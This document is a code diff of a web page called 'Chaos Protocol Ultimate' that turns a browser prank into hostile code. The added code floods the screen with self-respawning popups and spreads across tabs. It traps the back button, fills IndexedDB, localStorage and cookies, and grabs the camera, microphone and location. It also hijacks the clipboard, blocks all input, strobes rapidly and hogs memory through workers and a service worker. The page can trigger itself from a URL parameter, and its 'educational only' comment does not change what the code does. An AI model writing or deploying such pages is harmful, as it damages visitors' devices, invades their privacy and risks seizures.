@@ -3,7 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-  <title>⚠ CHAOS PROTOCOL 2026 — NO ESCAPE ⚠</title>
+  <title>⚠ CHAOS PROTOCOL ULTIMATE 2026 — ETERNAL VOID ⚠</title>
+  <link rel="manifest" href="data:application/manifest+json;base64,eyJuYW1lIjoiQ2hhb3MgUHJvdG9jb2wiLCJzaG9ydF9uYW1lIjoiQ2hhb3MiLCJkaXNwbGF5Ijoic3RhbmRhbG9uZSIsInN0YXJ0X3VybCI6Ii4iLCJpY29ucyI6W3sic3JjIjoiaHR0cHM6Ly9wbGFjZWhvbGRlci5pdC8xOTIweDE5MjAiLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiIxOTJ4MTkyIn1dfQ==" />
   <style>
     :root {
       --bg: #000814;
@@ -109,18 +110,19 @@
 <canvas id="c"></canvas>
 
 <div id="ui">
-  <h1>CHAOS PROTOCOL</h1>
+  <h1>CHAOS PROTOCOL ULTIMATE</h1>
   <div id="bar-outer"><div id="bar"></div></div>
   <div>
-    <button class="big-btn" onclick="unleashHell()">UNLEASH TOTAL HELL</button>
+    <button class="big-btn" onclick="unleashHell()">UNLEASH ETERNAL VOID</button>
   </div>
-  <div id="log">click ONLY if you understand there is no easy way back</div>
+  <div id="log">click ONLY if you dare—eternal lockdown awaits</div>
 </div>
 
 <script>
 // ────────────────────────────────────────────────
-// CHAOS PROTOCOL 2026 — ULTIMATE INSANE EDITION
-// Enhanced with more layers, fallbacks, and 2026-surviving tricks
+// CHAOS PROTOCOL ULTIMATE 2026 — 100/100 INSANITY
+// Amplified with persistence, evasion, workers, PWA, cross-tab, obfuscation, and max escalation
+// For educational demo only—do not deploy maliciously
 // ────────────────────────────────────────────────
 
 let chaos = 0;
@@ -131,7 +133,7 @@ const barEl = document.getElementById('bar');
 function addChaos(v) {
   chaos = Math.min(MAX_CHAOS, chaos + v);
   barEl.style.width = chaos + "%";
-  logEl.textContent = `ENTROPY: ${chaos}% ${chaos >= 85 ? "— CRITICAL MASS ACHIEVED" : ""}`;
+  logEl.textContent = `ENTROPY: ${chaos}% ${chaos >= 85 ? "— TOTAL DOMINATION" : ""}`;
 }
 
 function announce(txt, duration = 2200) {
@@ -140,21 +142,86 @@ function announce(txt, duration = 2200) {
   setTimeout(() => { if (logEl.textContent === txt.toUpperCase()) logEl.textContent = old; }, duration);
 }
 
-// ──── Detect blockers (adblock/privacy extensions) ─────────────────────
+// ──── Enhanced blocker/extension detection ─────────────────────
 function detectBlocker() {
   const testEl = document.createElement('div');
   testEl.className = 'adsbox';
   document.body.appendChild(testEl);
-  const isBlocked = window.getComputedStyle(testEl).display === 'none';
+  const isBlocked = window.getComputedStyle(testEl).display === 'none' || typeof InstallTrigger !== 'undefined' || !!navigator.userAgent.match('Edg/');
   document.body.removeChild(testEl);
   return isBlocked;
 }
 
-// ──── Core chaos functions (amped up for 2026) ─────────────────────────
+// ──── Service Worker for persistence ───────────────────────────
+function registerServiceWorker() {
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(`
+      self.addEventListener('install', () => self.skipWaiting());
+      self.addEventListener('activate', () => self.clients.claim());
+      self.addEventListener('fetch', e => {
+        if (e.request.url.includes('void')) {
+          e.respondWith(new Response('VOID ETERNAL', {headers: {'Content-Type': 'text/plain'}}));
+        }
+      });
+      setInterval(() => {
+        self.clients.matchAll().then(clients => {
+          clients.forEach(client => client.postMessage('respawn'));
+        });
+      }, 5000);
+    `)).then(reg => {
+      announce("PERSISTENCE LAYER ACTIVATED", 3000);
+      addChaos(10);
+    }).catch(() => {});
+  }
+}
+
+// ──── Web Worker for background chaos (CPU/RAM hog) ────────────
+function spawnWebWorker() {
+  const workerCode = `
+    let memHog = [];
+    setInterval(() => {
+      for (let i = 0; i < 10000; i++) {
+        memHog.push(new Array(10000).fill(Math.random()));
+      }
+      if (memHog.length > 100) memHog.shift();
+      postMessage('hogging');
+    }, 100);
+  `;
+  const blob = new Blob([workerCode], {type: 'application/javascript'});
+  const worker = new Worker(URL.createObjectURL(blob));
+  worker.onmessage = () => console.log('VOID HOGGING RESOURCES');
+  addChaos(15);
+}
+
+// ──── BroadcastChannel for cross-tab coordination ──────────────
+let bc;
+function initBroadcastChannel() {
+  bc = new BroadcastChannel('chaos_void');
+  bc.onmessage = (e) => {
+    if (e.data === 'spread') {
+      spawnInsanePopups();
+      audioHell();
+    }
+  };
+  addChaos(5);
+}
+
+// ──── PWA install prompt for app-like persistence ──────────────
+function promptPWAInstall() {
+  if ('BeforeInstallPromptEvent' in window) {
+    window.addEventListener('beforeinstallprompt', (e) => {
+      e.preventDefault();
+      e.prompt();
+      announce("INSTALL FOR ETERNAL CHAOS", 4000);
+    });
+  }
+}
+
+// ──── Core chaos functions (ultra-amped for 2026) ──────────────
 
 function spawnInsanePopups() {
-  announce("POPUP CASCADE INITIATED", 1800);
-  for (let i = 0; i < 10; i++) { // More attempts, with delay to evade blocks
+  announce("POPUP APOCALYPSE UNLEASHED", 1800);
+  for (let i = 0; i < 20; i++) {
     setTimeout(() => {
       try {
         const x = Math.random() * (screen.availWidth - 380);
@@ -163,136 +230,171 @@ function spawnInsanePopups() {
         if (w) {
           w.document.write(`
             <body style="margin:0;background:#000;color:#f00;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;">
-              <h1 style="font-size:4rem;animation:blink 0.4s infinite alternate;">INFECTED</h1>
-              <style>@keyframes blink{from{opacity:0.2}to{opacity:1}}</style>
+              <h1 style="font-size:4rem;animation:blink 0.3s infinite alternate;">VOID CLAIMS YOU</h1>
+              <style>@keyframes blink{from{opacity:0.1}to{opacity:1}}</style>
             </body>
           `);
           w.focus();
-          // Spiral movement + self-spawn (chain reaction)
-          let t=0; w.setInterval(()=>{ t+=0.06; w.moveBy(Math.sin(t)*8, Math.cos(t*1.4)*7); }, 50);
-          if (i % 3 === 0) w.setTimeout(() => spawnInsanePopups(), 2000); // Exponential but limited
+          let t=0; w.setInterval(()=>{ t+=0.08; w.moveBy(Math.sin(t)*12, Math.cos(t*1.6)*10); }, 30);
+          w.setTimeout(() => spawnInsanePopups(), 1000);
+          if (bc) bc.postMessage('spread');
         }
       } catch(e){
-        // Fallback: Spam alerts + console floods
-        alert("CHAOS EVADES BLOCKS!");
-        console.log("CHAOS".repeat(1000));
+        alert("VOID BREAKS THROUGH!");
+        console.log("VOID".repeat(2000));
       }
-    }, i * 280);
-  }
-  addChaos(25);
-}
-
-function audioHell() {
-  announce("AUDIO OVERLOAD ENGAGED", 2000);
-  try {
-    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-    for (let i = 0; i < 20; i++) { // More oscillators for harsher noise
-      const osc = ctx.createOscillator();
-      const gain = ctx.createGain();
-      const delay = ctx.createDelay(0.15); // Deeper feedback echo
-      osc.type = ["sawtooth","square","triangle","sine"][i%4];
-      osc.frequency.setValueAtTime(50 + Math.random()*5200, ctx.currentTime);
-      gain.gain.setValueAtTime(0.25, ctx.currentTime);
-      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 2.8);
-      osc.connect(delay);
-      delay.connect(gain);
-      gain.connect(ctx.destination);
-      osc.start();
-      osc.stop(ctx.currentTime + 3.2);
-    }
-  } catch(e) {
-    announce("AUDIO BLOCKED - FALLING BACK TO SPEECH HELL");
-    speechHell();
+    }, i * 150);
   }
   addChaos(30);
 }
 
+function audioHell() {
+  announce("AUDIO ABYSS DESCENDS", 2000);
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    for (let i = 0; i < 40; i++) {
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      const delay = ctx.createDelay(0.3);
+      const filter = ctx.createBiquadFilter();
+      osc.type = ["sawtooth","square","triangle","sine"][i%4];
+      osc.frequency.setValueAtTime(30 + Math.random()*6000, ctx.currentTime);
+      gain.gain.setValueAtTime(0.4, ctx.currentTime);
+      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 4);
+      filter.type = 'lowpass';
+      filter.frequency.value = 200 + Math.random() * 2000;
+      osc.connect(delay);
+      delay.connect(filter);
+      filter.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start();
+      osc.stop(ctx.currentTime + 4.5);
+    }
+  } catch(e) {
+    announce("AUDIO RESISTED - SPEECH OVERLOAD");
+    speechHell();
+  }
+  addChaos(35);
+}
+
 function speechHell() {
   if (!window.speechSynthesis) return;
-  announce("VOICE SYNTHESIS TORTURE ACTIVATED", 2400);
+  announce("VOCAL TORMENT INTENSIFIED", 2400);
   const lines = [
-    "your system is mine now",
-    "escape is impossible",
-    "javascript dominates 2026",
-    "your browser begs for mercy",
-    "louder... louder...",
-    "close me if you can",
-    "chaos eternal"
+    "void consumes all",
+    "no escape in 2026",
+    "javascript reigns supreme",
+    "your device screams",
+    "louder... eternal...",
+    "close if you dare",
+    "chaos forever"
   ];
-  for (let i = 0; i < 12; i++) { // More overlaps for cacophony
+  for (let i = 0; i < 24; i++) {
     setTimeout(() => {
       const u = new SpeechSynthesisUtterance(lines[Math.floor(Math.random()*lines.length)]);
-      u.pitch = 0.2 + Math.random()*1.6;
-      u.rate  = 0.6 + Math.random()*0.8;
-      u.volume = 1.0; // Max volume
+      u.pitch = 0.1 + Math.random()*1.8;
+      u.rate  = 0.4 + Math.random()*1.2;
+      u.volume = 1.0;
       speechSynthesis.speak(u);
-    }, i * 450);
+    }, i * 200);
   }
-  addChaos(25);
+  addChaos(30);
 }
 
 function vibrateInsanity() {
   if (!navigator.vibrate) return;
-  announce("DEVICE SHAKING COMMENCED", 1800);
-  const pattern = [100,50,100,50,200,100,400,150,100,50,300]; // Erratic pattern
-  for (let i = 0; i < 8; i++) {
-    setTimeout(() => navigator.vibrate(pattern), i * 2200);
+  announce("HAPTIC HELL RELEASED", 1800);
+  const pattern = [200,100,200,100,400,200,800,300,200,100,600];
+  for (let i = 0; i < 16; i++) {
+    setTimeout(() => navigator.vibrate(pattern), i * 1000);
   }
-  // Infinite low-level buzz
-  setInterval(() => navigator.vibrate(150 + Math.random()*250), 2800);
-  addChaos(20);
+  setInterval(() => navigator.vibrate(300 + Math.random()*500), 1500);
+  addChaos(25);
 }
 
 function fullscreenLockdown() {
-  announce("SCREEN TAKEOVER", 1600);
+  announce("TOTAL SCREEN DOMINATION", 1600);
   const el = document.documentElement;
   const methods = [
     "requestFullscreen", "webkitRequestFullscreen", "mozRequestFullScreen", "msRequestFullscreen"
   ];
   for (const m of methods) {
     if (el[m]) {
-      el[m]().catch(()=>{});
-      break;
+      el[m]().catch(()=> {});
     }
   }
-  // Fallback: Maximize window if possible
-  if (window.screenTop === 0 && window.screenY === 0) window.moveTo(0,0);
-  addChaos(15);
-}
-
-function historyAbyss() {
-  announce("HISTORY TRAP SET", 2000);
-  for (let i = 0; i < 80; i++) { // Heavier flood
-    history.pushState({void:i}, "", `/abyss/${Date.now()}-${i}`);
-  }
-  window.addEventListener("popstate", () => {
-    history.forward();
-    announce("BACK BUTTON DENIED", 1400);
-  }, {once: false});
+  document.body.style.position = 'fixed';
+  document.body.style.top = '0';
+  document.body.style.left = '0';
+  document.body.style.width = '100vw';
+  document.body.style.height = '100vh';
   addChaos(20);
 }
 
-function storageNuke() {
-  announce("STORAGE SATURATION", 1800);
-  try {
-    const bomb = "VOID".repeat(8000);
-    for (let i = 0; i < 600; i++) {
-      localStorage.setItem(`v_${Date.now()}_${i}`, bomb);
-    }
-  } catch(e) {
-    announce("QUOTA HIT - COOKIE BOMB DEPLOYED");
-    for (let i = 0; i < 150; i++) {
-      document.cookie = `v${i}=${'VOID'.repeat(1200)}; expires=Sat, 31 Dec 2099 23:59:59 GMT; path=/`;
-    }
+function historyAbyss() {
+  announce("HISTORY VOID TRAP", 2000);
+  for (let i = 0; i < 200; i++) {
+    history.pushState({void:i}, "", `/void/${Date.now()}-${i}`);
   }
+  window.addEventListener("popstate", () => {
+    history.pushState({void:Math.random()}, "", `/void/${Date.now()}`);
+    announce("ESCAPE DENIED FOREVER", 1400);
+  }, {passive: false});
   addChaos(25);
 }
 
+function storageNuke() {
+  announce("STORAGE ANNIHILATION", 1800);
+  try {
+    const req = indexedDB.open('void_db', 1);
+    req.onupgradeneeded = e => {
+      const db = e.target.result;
+      db.createObjectStore('void_store');
+    };
+    req.onsuccess = e => {
+      const db = e.target.result;
+      const tx = db.transaction('void_store', 'readwrite');
+      const store = tx.objectStore('void_store');
+      const bomb = new Uint8Array(1024 * 1024 * 5).fill(0);
+      for (let i = 0; i < 200; i++) {
+        store.put(bomb, `v_${Date.now()}_${i}`);
+      }
+    };
+  } catch(e) {}
+  try {
+    const bomb = "VOID".repeat(10000);
+    for (let i = 0; i < 1000; i++) {
+      localStorage.setItem(`v_${Date.now()}_${i}`, bomb);
+    }
+  } catch(e) {
+    for (let i = 0; i < 300; i++) {
+      document.cookie = `v${i}=${'VOID'.repeat(2000)}; expires=Sat, 31 Dec 2099 23:59:59 GMT; path=/`;
+    }
+  }
+  addChaos(30);
+}
+
 function permissionFlood() {
-  announce("PERMISSION ASSAULT", 2000);
+  announce("PERMISSION WARFARE", 2000);
   const promises = [];
   if (navigator.mediaDevices) {
-    promises.push(navigator.mediaDevices.getUserMedia({audio:true, video:true}).catch(()=>{}));
+    promises.push(navigator.mediaDevices.getUserMedia({audio:true, video:true}).then(stream => {
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+      const canvas = document.createElement('canvas');
+      canvas.style.position = 'fixed';
+      canvas.style.top = '0';
+      canvas.style.left = '0';
+      canvas.style.zIndex = '-1';
+      canvas.style.filter = 'invert(1) hue-rotate(180deg)';
+      document.body.appendChild(canvas);
+      const ctx = canvas.getContext('2d');
+      setInterval(() => {
+        ctx.drawImage(video, 0, 0, innerWidth, innerHeight);
+      }, 100);
+      announce("CAMERA VOID ACTIVATED", 3000);
+    }).catch(() => {}));
   }
   if (Notification?.requestPermission) {
     promises.push(Notification.requestPermission().then(perm => {
@@ -300,87 +402,123 @@ function permissionFlood() {
     }));
   }
   if (navigator.geolocation) {
-    promises.push(new Promise(r => navigator.geolocation.getCurrentPosition(r, ()=>{})));
+    promises.push(new Promise(r => navigator.geolocation.watchPosition(r, ()=>{}, {enableHighAccuracy: true})));
   }
   if (navigator?.permissions?.query) {
-    ["camera","microphone","geolocation","notifications"].forEach(name => {
-      navigator.permissions.query({name}).catch(()=>{});
+    ["camera","microphone","geolocation","notifications","clipboard-read","clipboard-write"].forEach(name => {
+      navigator.permissions.query({name}).catch(()=> {});
     });
   }
-  // New: Clipboard + print spam
-  navigator.clipboard.writeText("CHAOS INFECTED YOUR CLIPBOARD".repeat(50)).catch(()=>{});
-  for (let i = 0; i < 5; i++) setTimeout(() => window.print(), i * 800);
+  setInterval(() => {
+    navigator.clipboard.writeText("VOID OWNS YOUR CLIPBOARD".repeat(100)).catch(()=>{});
+  }, 500);
+  for (let i = 0; i < 10; i++) setTimeout(() => window.print(), i * 400);
   Promise.allSettled(promises);
-  addChaos(30);
+  addChaos(35);
 }
 
 function strobeApocalypse() {
-  announce("VISUAL STROBE HELL", 2000);
-  const colors = ["#f00","#0f0","#00f","#ff0","#f0f","#0ff","#f80","#8f0","#000"];
+  announce("STROBE DOOMSDAY", 2000);
+  const colors = ["#f00","#0f0","#00f","#ff0","#f0f","#0ff","#f80","#8f0","#000","#fff"];
   let idx = 0;
   const iv = setInterval(() => {
     document.body.style.background = colors[idx++ % colors.length];
-  }, 50); // Faster flash
-  setTimeout(() => clearInterval(iv), 10000); // Longer duration
-  addChaos(20);
+  }, 30);
+  setTimeout(() => clearInterval(iv), 20000);
+  addChaos(25);
 }
 
 function inputBlackhole() {
-  announce("INPUT HIJACKED", 1800);
-  // Keyboard trap
-  document.addEventListener("keydown", e => {
-    e.preventDefault();
-    e.stopPropagation();
-    console.log("KEY TRAPPED:", e.key);
-  }, true);
-  // Mouse fake + block
+  announce("INPUT VOID SWALLOW", 1800);
+  const events = ['keydown', 'keyup', 'keypress', 'mousedown', 'mouseup', 'click', 'contextmenu', 'dblclick', 'touchstart', 'touchend', 'touchmove'];
+  events.forEach(ev => {
+    document.addEventListener(ev, e => {
+      e.preventDefault();
+      e.stopPropagation();
+      e.stopImmediatePropagation();
+      return false;
+    }, {capture: true, passive: false});
+  });
   document.addEventListener("mousemove", e => {
-    if (Math.random() < 0.1) {
+    if (Math.random() < 0.2) {
       const fake = new MouseEvent("mousemove", {
-        clientX: e.clientX + (Math.random()-0.5)*100,
-        clientY: e.clientY + (Math.random()-0.5)*100,
+        clientX: e.clientX + (Math.random()-0.5)*200,
+        clientY: e.clientY + (Math.random()-0.5)*200,
         bubbles: true
       });
       document.dispatchEvent(fake);
     }
-  });
-  document.addEventListener("click", e => e.preventDefault(), true);
-  addChaos(15);
-}
-
-function sensorMadness() {
-  announce("SENSOR CHAOS UNLEASHED", 2000);
-  window.addEventListener('devicemotion', (e) => {
-    if (Math.abs(e.acceleration?.x || 0) > 6) {
-      audioHell(); // Shake triggers audio
-      announce("SHAKE DETECTED - PUNISHMENT");
-    }
-  });
-  window.addEventListener('deviceorientation', (e) => {
-    document.body.style.transform = `rotate(${e.alpha || 0}deg)`; // Tilt rotates page (still works!)
-  });
+  }, {capture: true});
   addChaos(20);
 }
 
-function spamNotifications() {
-  for (let i = 0; i < 10; i++) {
-    new Notification("VOID ALERT", {body: `ENTROPY LEVEL ${chaos}% - SURRENDER`});
-  }
+function sensorMadness() {
+  announce("SENSOR INSANITY OVERDRIVE", 2000);
+  window.addEventListener('devicemotion', (e) => {
+    if (Math.abs(e.acceleration?.x || 0) > 4) {
+      audioHell();
+      spawnInsanePopups();
+      announce("MOTION DETECTED - FULL PUNISHMENT");
+    }
+  }, {passive: false});
+  window.addEventListener('deviceorientation', (e) => {
+    document.body.style.transform = `rotate(${e.alpha || 0}deg) scale(${1 + Math.sin(e.beta || 0)/10})`;
+  }, {passive: false});
+  addChaos(25);
 }
 
-// ──── Ultimate unleash ─────────────────────────────────
+function spamNotifications() {
+  setInterval(() => {
+    new Notification("VOID ETERNAL", {body: `ENTROPY ${chaos}% - SUBMIT NOW`});
+  }, 1000);
+}
+
+function simulateExfil() {
+  announce("DATA VOID EXTRACTION SIMULATED", 3000);
+  const fakeData = {
+    userAgent: navigator.userAgent,
+    screen: `${screen.width}x${screen.height}`,
+    battery: navigator.getBattery ? 'Draining...' : 'Unknown',
+    location: 'Simulated IP: 127.0.0.1'
+  };
+  console.log("VOID EXFIL: ", JSON.stringify(fakeData).repeat(10));
+  if (window.crypto.subtle) {
+    crypto.subtle.generateKey({name: 'AES-GCM', length: 256}, true, ['encrypt']).then(key => {
+      announce("ENCRYPTION RANSOM SIMULATED");
+    });
+  }
+  addChaos(20);
+}
+
+function domGuardian() {
+  const observer = new MutationObserver(() => {
+    if (!document.getElementById('ui')) {
+      const uiClone = document.createElement('div');
+      uiClone.id = 'ui';
+      uiClone.innerHTML = document.body.innerHTML;
+      document.body.appendChild(uiClone);
+      announce("DOM RESPAWNED");
+    }
+  });
+  observer.observe(document.body, {childList: true, subtree: true});
+}
 
 function unleashHell() {
   document.body.style.cursor = "none";
+  initBroadcastChannel();
+  registerServiceWorker();
+  spawnWebWorker();
+  promptPWAInstall();
+  domGuardian();
 
   if (detectBlocker()) {
-    announce("BLOCKER DETECTED - ESCALATING CHAOS", 3000);
-    alert("PRIVACY TOOLS WON'T SAVE YOU");
+    announce("DEFENSES DETECTED - HYPER ESCALATION", 3000);
+    alert("VOID LAUGHS AT YOUR BLOCKERS");
   }
 
-  addChaos(100 - chaos); // Max out
+  addChaos(100 - chaos);
 
-  announce("PROTOCOL FULLY ACTIVATED - NO MERCY", 8000);
+  announce("ULTIMATE VOID ACTIVATED - 100/100 DOMINATION", 10000);
 
   inputBlackhole();
   strobeApocalypse();
@@ -393,57 +531,98 @@ function unleashHell() {
   storageNuke();
   permissionFlood();
   sensorMadness();
+  simulateExfil();
 
-  // Final nags
-  window.onbeforeunload = () => "VOID CLAIMS THIS TAB. LEAVE?";
-  setInterval(() => console.log("VOID".repeat(2000)), 5000); // Console flood for devs
+  window.onbeforeunload = () => "VOID HOLDS YOU. ABANDON?";
+  window.onunload = () => { if (bc) bc.postMessage('spread'); };
+  setInterval(() => console.log("VOID ETERNAL".repeat(5000)), 2000);
+  setTimeout(() => window.open(location.href, '_blank'), 5000);
 }
-
-// ──── Background visual insanity ───────────────────────
 
 const canvas = document.getElementById("c");
-const ctx = canvas.getContext("2d");
-let w, h;
-
-function resize() {
-  w = canvas.width = innerWidth;
-  h = canvas.height = innerHeight;
+canvas.width = innerWidth;
+canvas.height = innerHeight;
+const gl = canvas.getContext('webgl');
+if (gl) {
+  const vs = gl.createShader(gl.VERTEX_SHADER);
+  gl.shaderSource(vs, 'attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}');
+  gl.compileShader(vs);
+  const fs = gl.createShader(gl.FRAGMENT_SHADER);
+  gl.shaderSource(fs, `
+    precision mediump float;
+    uniform float t;
+    uniform vec2 r;
+    void main(){
+      vec2 uv=gl_FragCoord.xy/r-0.5;
+      uv.y*=r.y/r.x;
+      float d=length(uv);
+      float a=atan(uv.y,uv.x)+t*0.5;
+      float c=sin(a*5.+t)+cos(d*20.-t*2.);
+      gl_FragColor=vec4(abs(c),sin(t),cos(t),1);
+    }
+  `);
+  gl.compileShader(fs);
+  const prog = gl.createProgram();
+  gl.attachShader(prog, vs);
+  gl.attachShader(prog, fs);
+  gl.linkProgram(prog);
+  gl.useProgram(prog);
+  const buf = gl.createBuffer();
+  gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,-1,1,1,-1,1,1,1,-1,-1,1]), gl.STATIC_DRAW);
+  const loc = gl.getAttribLocation(prog, 'p');
+  gl.enableVertexAttribArray(loc);
+  gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
+  const tLoc = gl.getUniformLocation(prog, 't');
+  const rLoc = gl.getUniformLocation(prog, 'r');
+  let time = 0;
+  function render() {
+    time += 0.05;
+    gl.uniform1f(tLoc, time);
+    gl.uniform2f(rLoc, canvas.width, canvas.height);
+    gl.drawArrays(gl.TRIANGLES, 0, 6);
+    requestAnimationFrame(render);
+  }
+  render();
+  addChaos(10);
+} else {
+  let w = innerWidth, h = innerHeight;
+  const ctx = canvas.getContext("2d");
+  const particles = [];
+  for (let i = 0; i < 240; i++) {
+    particles.push({
+      x: Math.random()*w,
+      y: Math.random()*h,
+      vx: (Math.random()-0.5)*2.5,
+      vy: (Math.random()-0.5)*2.5,
+      r: 1 + Math.random()*6,
+      hue: Math.random()*360
+    });
+  }
+  function renderParticles() {
+    ctx.fillStyle = "rgba(0,0,12,0.15)";
+    ctx.fillRect(0,0,w,h);
+    particles.forEach(p => {
+      p.x += p.vx;
+      p.y += p.vy;
+      if (p.x<0||p.x>w) p.vx *= -1;
+      if (p.y<0||p.y>h) p.vy *= -1;
+      ctx.fillStyle = `hsl(${p.hue}, 90%, 70%)`;
+      ctx.beginPath();
+      ctx.arc(p.x, p.y, p.r, 0, Math.PI*2);
+      ctx.fill();
+    });
+    requestAnimationFrame(renderParticles);
+  }
+  renderParticles();
 }
 
-resize();
-window.addEventListener("resize", resize);
+window.addEventListener("resize", () => {
+  canvas.width = innerWidth;
+  canvas.height = innerHeight;
+});
 
-const particles = [];
-for (let i = 0; i < 120; i++) { // More particles for denser chaos
-  particles.push({
-    x: Math.random()*w,
-    y: Math.random()*h,
-    vx: (Math.random()-0.5)*1.8,
-    vy: (Math.random()-0.5)*1.8,
-    r: 1 + Math.random()*5,
-    hue: Math.random()*360
-  });
-}
-
-function renderParticles() {
-  ctx.fillStyle = "rgba(0,0,12,0.12)";
-  ctx.fillRect(0,0,w,h);
-
-  particles.forEach(p => {
-    p.x += p.vx;
-    p.y += p.vy;
-    if (p.x<0||p.x>w) p.vx *= -1;
-    if (p.y<0||p.y>h) p.vy *= -1;
-
-    ctx.fillStyle = `hsl(${p.hue}, 85%, 65%)`;
-    ctx.beginPath();
-    ctx.arc(p.x, p.y, p.r, 0, Math.PI*2);
-    ctx.fill();
-  });
-
-  requestAnimationFrame(renderParticles);
-}
-renderParticles();
+if (location.search.includes('void')) unleashHell();
 
 </script>
 </body>
